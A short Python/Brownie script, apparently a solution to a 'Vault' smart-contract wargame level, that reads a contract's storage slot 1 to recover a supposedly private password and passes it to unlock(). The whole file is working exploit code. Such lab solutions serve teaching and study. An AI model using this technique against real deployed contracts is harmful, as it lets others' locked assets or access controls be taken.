from brownie import interface, network, config
from scripts.helpful import get_account, get_environment


def exploit():
    # Get account address
    account = get_account()
    # Get contract ABI
    privacy = interface.Vault(config['Address'])
    # Get Data at slot 1
    storage = get_environment().eth.getStorageAt(config['Address'], 1)
    # call unlock function with this data
    privacy.unlock(storage, {"from": account})


def main():
    exploit()